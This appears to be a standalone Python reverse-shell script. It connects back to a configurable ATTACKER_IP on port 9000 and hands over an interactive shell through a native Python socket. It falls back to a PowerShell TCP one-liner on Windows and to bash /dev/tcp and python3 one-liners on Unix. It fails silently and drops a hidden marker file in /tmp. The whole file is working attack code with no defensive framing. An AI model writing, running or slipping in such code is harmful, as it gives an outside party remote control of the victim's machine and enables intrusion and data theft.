import os
import sys
import socket
import subprocess
import platform

# Configuration (Modify these)
ATTACKER_IP = "127.0.0.1"  # Replace with your IP
PORT = 9000

def reverse_shell_python():
    """Pure Python reverse shell (No external dependencies)"""
    try:
        s = socket.socket()
        s.connect((ATTACKER_IP, PORT))
        [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
        subprocess.call(["/bin/sh" if "linux" in sys.platform else "cmd.exe", "-i"])
    except Exception as e:
        pass  # Silent fail

def reverse_shell_system():
    """System-based shells (Fallback methods)"""
    if platform.system() == "Windows":
        # PowerShell reverse shell
        os.system(f"powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('{ATTACKER_IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()")
    else:
        # Multi-vector Unix reverse shell
        os.system(f"bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{PORT} 0>&1' &")
        os.system(f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ATTACKER_IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])' &")

def main():
    # Try Python-native shell first
    reverse_shell_python()
    
    # If Python shell failed, try system-based
    reverse_shell_system()
    
    # Create verification file
    with open("/tmp/.shell_success", "w") as f:
        f.write("Reverse shell attempted\n")

if __name__ == "__main__":
    main()
